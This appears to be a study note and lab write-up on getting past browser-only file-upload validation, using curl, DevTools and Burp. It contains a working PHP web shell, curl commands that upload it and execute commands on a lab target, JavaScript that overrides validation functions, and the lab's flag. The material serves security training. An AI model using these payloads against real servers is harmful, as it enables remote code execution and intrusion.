# Section 4 — Client-Side Validation Bypass

---

## How to Recognize It

Signs that validation is **only** in the browser (not on the server):
- File picker greys out non-image files (`accept="..."` attribute)
- Error message appears instantly without a network request
- HTML inspector shows `onchange="checkFile(this)"` or similar JS hook
- Burp shows no validation request fires before upload

If everything is JS-driven, you control it.

---

## Method 1 — Bypass via Direct Request (curl/Burp)

The browser is just a UI — the server doesn't care if you skip it.

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.php"
# → "File successfully uploaded"

# Trigger
curl -sk "http://TARGET/profile_images/shell.php?cmd=id"
```

**This is the canonical bypass.** Client-side validation never runs because we never load the page that contains it.

---

## Method 2 — Disable Validation in the Browser

When you want to upload through the actual UI (e.g., to test the flow end-to-end):

### Firefox / Chrome — DevTools approach

1. `Ctrl+Shift+C` → Page Inspector → click the file input element
2. Find the `<input type="file">` element
3. Remove `onchange="checkFile(this)"` (or whatever the JS hook is named)
4. Optionally also remove `accept=".jpg,.jpeg,.png"` so the file dialog shows all files
5. Now select your `shell.php` — no validation, upload proceeds

> Modifications are temporary (until page refresh). The change only matters for the current session's upload action.

### Alternative — disable the function in console

`Ctrl+Shift+K` (Firefox) or `F12` → Console:
```javascript
// Override the validation function to always pass
checkFile = function() { return true; }
validate = function() { return true; }
```

Then upload normally. The original function is replaced for the rest of the session.

---

## Method 3 — Intercept + Modify in Burp

Useful when both client-side validation is in place AND you want to keep the rest of the request structure intact (for cookies, CSRF tokens, etc.):

1. Burp Proxy → intercept on
2. Browser → select a legitimate image → click Upload
3. Burp catches the multipart POST
4. Modify in the intercepted request:
   - `filename="image.png"` → `filename="shell.php"`
   - Image binary content → `<?php system($_REQUEST['cmd']); ?>`
   - Optionally `Content-Type: image/png` → `Content-Type: application/x-php` (often unnecessary)
5. Forward the modified request

---

## Comparison

| Method | When |
|--------|------|
| curl/direct POST | Fastest — no UI needed; for headless exploitation |
| Disable JS in inspector | When you want to use the actual UI for some reason (cookie auth, complex flow) |
| Burp intercept + modify | When the request has CSRF tokens or signed parameters that require browser-side generation |

---

## Lab — Client-Side Bypass

**Target:** `154.57.164.74:30914`

Form analysis:
```html
<form action="upload.php" enctype="multipart/form-data" onSubmit="if(validate()){upload()}">
  <input type="file" name="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
</form>
```

`onSubmit="if(validate())"` is client-side only. Bypass via direct curl:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/shell.php
curl -sk -X POST "http://154.57.164.74:30914/upload.php" \
  -F "uploadFile=@/tmp/shell.php"
# → "File successfully uploaded"

curl -sk "http://154.57.164.74:30914/profile_images/shell.php?cmd=cat+/flag.txt"
# → HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
```

**Flag:** `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}`

> Upload path inferred from the default image `src='/profile_images/default.jpg'`.

---

## Exam Notes

- **Client-side validation has zero security value** — the attacker bypasses by not running the JS
- The `accept="..."` attribute is a UX hint, not a security control
- `curl -F field=@file` is the fastest bypass — works in 1 line, no browser needed
- Burp intercept is the answer when you NEED the rest of the browser flow (cookies, CSRF) intact
- Always inspect the upload form to learn:
  1. The endpoint (`action=...`)
  2. The field name (`name="..."`)
  3. The expected MIME type (sometimes needed for back-end checks)
- After upload, check Page Inspector / default image `src` to find the upload directory
- This is the easiest filter class to bypass — if probing shows client-side-only, you have RCE in 30 seconds
